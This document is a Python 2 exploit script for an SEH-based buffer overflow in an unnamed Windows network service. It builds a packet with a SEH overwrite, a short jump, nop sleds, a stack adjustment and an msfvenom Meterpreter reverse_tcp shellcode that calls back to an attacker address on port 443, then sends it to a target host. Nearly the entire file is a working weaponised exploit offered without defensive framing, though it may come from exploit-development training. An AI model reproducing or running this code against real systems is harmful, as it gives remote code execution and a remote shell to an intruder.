#!/usr/bin/python

import socket
import sys
from struct import pack

# Captured traffic on initial client -> server connection
# 1. Initial headers
# 2. Length value and follow up (stuff?)
# 3. ASCII data
# 4. Packet end
#
# \x75\x19\xba\xab\x03\x00\x00\x00\x01\x00\x00\x00
# \x1a\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00
# \x53\x45\x52\x56\x45\x52\x5f\x47\x45\x54\x5f\x49\x4e\x46\x4f\x02\x32\x01\x44\x61\x74
# \x61\x01\x30\x01\x00\xb1\xfb\x28\x2c\x08\x03

if len(sys.argv) < 3:
    print "[+] Usage: xxx.py <host> <port>"
else:
    host = sys.argv[1]
    port = sys.argv[2]

#payload = "\x41"*1500

# SEH: 100133E7 (located via !mona seh)

# Initial buffer, 124 bytes to SEH overwrite(s)
fill = "\x41"*124

# Our SEH values, move to latter, then jmp 6
seh = "\x90\x90\xEB\x06"
seh += "\xE7\x33\x01\x10"

# A small nop sled for kicks
nops = "\x90"*10

# A stack adjustment, 
# add ESP, 50h
# jmp [ESP]
stackAdj = "\x83\xC4\x50"
stackAdj += "\xFF\x24\x24"

# Some padding, on the stack 50h bytes from the landing point of SEH lies a portion of buffer
# This is a large portion, and can fit our shellcode
# We can take advantage of this and land at 'C'
nops2 = "\x90"*112
#shellcode = "\x43"

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.138.XXX LPORT=443 -f py -b '\x00'
# 360 bytes
buf =  ""
buf += "\xbb\x10\x18\x95\xc3\xd9\xed\xd9\x74\x24\xf4\x5d\x29"
buf += "\xc9\xb1\x54\x83\xc5\x04\x31\x5d\x0f\x03\x5d\x1f\xfa"
buf += "\x60\x3f\xf7\x78\x8a\xc0\x07\x1d\x02\x25\x36\x1d\x70"
buf += "\x2d\x68\xad\xf2\x63\x84\x46\x56\x90\x1f\x2a\x7f\x97"
buf += "\xa8\x81\x59\x96\x29\xb9\x9a\xb9\xa9\xc0\xce\x19\x90"
buf += "\x0a\x03\x5b\xd5\x77\xee\x09\x8e\xfc\x5d\xbe\xbb\x49"
buf += "\x5e\x35\xf7\x5c\xe6\xaa\x4f\x5e\xc7\x7c\xc4\x39\xc7"
buf += "\x7f\x09\x32\x4e\x98\x4e\x7f\x18\x13\xa4\x0b\x9b\xf5"
buf += "\xf5\xf4\x30\x38\x3a\x07\x48\x7c\xfc\xf8\x3f\x74\xff"
buf += "\x85\x47\x43\x82\x51\xcd\x50\x24\x11\x75\xbd\xd5\xf6"
buf += "\xe0\x36\xd9\xb3\x67\x10\xfd\x42\xab\x2a\xf9\xcf\x4a"
buf += "\xfd\x88\x94\x68\xd9\xd1\x4f\x10\x78\xbf\x3e\x2d\x9a"
buf += "\x60\x9e\x8b\xd0\x8c\xcb\xa1\xba\xd8\x38\x88\x44\x18"
buf += "\x57\x9b\x37\x2a\xf8\x37\xd0\x06\x71\x9e\x27\x69\xa8"
buf += "\x66\xb7\x94\x53\x97\x91\x52\x07\xc7\x89\x73\x28\x8c"
buf += "\x49\x7c\xfd\x39\x40\xea\x3e\x15\xde\x6a\xd6\x64\xdf"
buf += "\x6b\x9c\xe0\x39\x3b\xb2\xa2\x95\xfb\x62\x03\x46\x93"
buf += "\x68\x8c\xb9\x83\x92\x46\xd2\x29\x7d\x3f\x8a\xc5\xe4"
buf += "\x1a\x40\x74\xe8\xb0\x2c\xb6\x62\x31\xd0\x78\x83\x30"
buf += "\xc2\x6c\xf2\xba\x1a\x6c\x9f\xba\x70\x68\x09\xec\xec"
buf += "\x72\x6c\xda\xb2\x8d\x5b\x58\xb4\x71\x1a\x69\xce\x47"
buf += "\x88\xd5\xb8\xa7\x5c\xd6\x38\xf1\x36\xd6\x50\xa5\x62"
buf += "\x85\x45\xaa\xbe\xb9\xd5\x3e\x41\xe8\x8a\xe9\x29\x16"
buf += "\xf4\xdd\xf5\xe9\xd3\x5e\xf1\x16\xa1\x42\x5a\x7f\x59"
buf += "\xc2\x5a\x7f\x33\xc2\x0a\x17\xc8\xed\xa5\xd7\x31\x24"
buf += "\xee\x7f\xbb\xa8\x5c\xe1\xbc\xe1\x01\xbf\xbd\x05\x9a"
buf += "\xd6\x33\xea\x1d\xd7\xb5\xd7\xcb\xee\xc3\x10\xc8\x54"
buf += "\xdb\x2b\x6d\xfc\x76\x53\x21\xfe\x52"

payload = fill + seh + nops + stackAdj + nops2 + buf + "\x41"*(1500 - len(fill + seh))

headers = "\x75\x19\xba\xab"
headers += "\x03\x00\x00\x00"
headers += "\x01\x00\x00\x00"
data = pack('<I', len(payload))
data += pack('<I', len(payload))
data += pack('<I', ord(payload[-1]))

packet = headers + data + payload


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  print "[*] Testing connection to target %s:%s" %(host,port)
  s.connect((host, int(port)))
  
except:
  print "[-] Unable to communicate to target %s:%s" %(host,port)
  sys.exit(1)

print "[!] Sending: %s" %(packet)
s.send(packet)
